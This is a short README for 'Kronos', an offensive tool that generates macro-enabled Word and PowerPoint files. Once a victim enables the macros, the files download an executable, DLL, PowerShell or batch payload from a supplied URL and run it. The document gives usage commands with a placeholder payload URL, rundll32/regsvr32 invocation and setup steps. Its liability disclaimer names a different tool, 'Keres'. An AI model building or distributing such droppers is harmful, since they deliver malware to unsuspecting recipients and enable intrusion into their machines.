![!\[Alt text\](<>)](<2023-12-24 10_34_53-Photos.png>)


Greetings
--------------------------

Kronos is a doc and ppt exploitation tool to deliver Payloads via Vba macros by downloding the PE from a URL 

it generates a docm or pptm , if macros disabled by default ,victim needs to enable macros

for an exe use :

python kronos.py -Url 'https://your.link' --word_file 'if you have a docx file' -PE 'name.exe'

for a dll  use : 

python kronos.py -Url 'https://your.link' --word_file 'if you have a docx file' -PE " {rundll32 or regsvr32} {name.dll} ,{function if needed} "

you can also run a ps1 or bat file 




setup:
------------

git clone https://github.com/ELMERIKH/Kronos

pip install -r requirements.txt

python3 Kronos.py

DISCLAIMER :
----------------------------------

ME The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided. ME The author and anyone affiliated with will not be liable for any losses and/or damages in connection with use of Keres. By using Keres or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again Keres is for EDUCATION and/or RESEARCH purposes ONLY.

